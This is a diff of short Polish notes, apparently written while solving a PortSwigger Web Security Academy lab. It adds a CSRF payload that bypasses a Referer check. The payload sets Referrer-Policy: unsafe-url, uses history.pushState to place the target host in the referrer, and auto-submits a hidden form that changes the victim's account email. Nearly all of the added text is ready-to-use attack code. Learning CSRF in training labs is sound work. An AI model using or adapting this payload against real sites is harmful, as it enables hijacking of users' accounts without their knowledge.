@@ -11,3 +11,17 @@ To mozemy dolozyc znacznik html ("<meta name="referrer" content="never">")
 <script>
 document.forms[0].submit();
 </script>
+
+Jezeli jest taka sytuacja ze server sprawdza referrer to mozna tak:
+
+[Header]
+Referrer-Policy: unsafe-url
+
+[Script]
+<script>history.pushState('', '', '/?0a5a008d0424c054c06b7f7500e40067.web-security-academy.net')</script>
+<form method="POST" action="https://0a5a008d0424c054c06b7f7500e40067.web-security-academy.net/my-account/change-email">
+<input required type="email" name="email" value="rambo@bambo.lambo">
+</form>
+<script>
+document.forms[0].submit();
+</script>
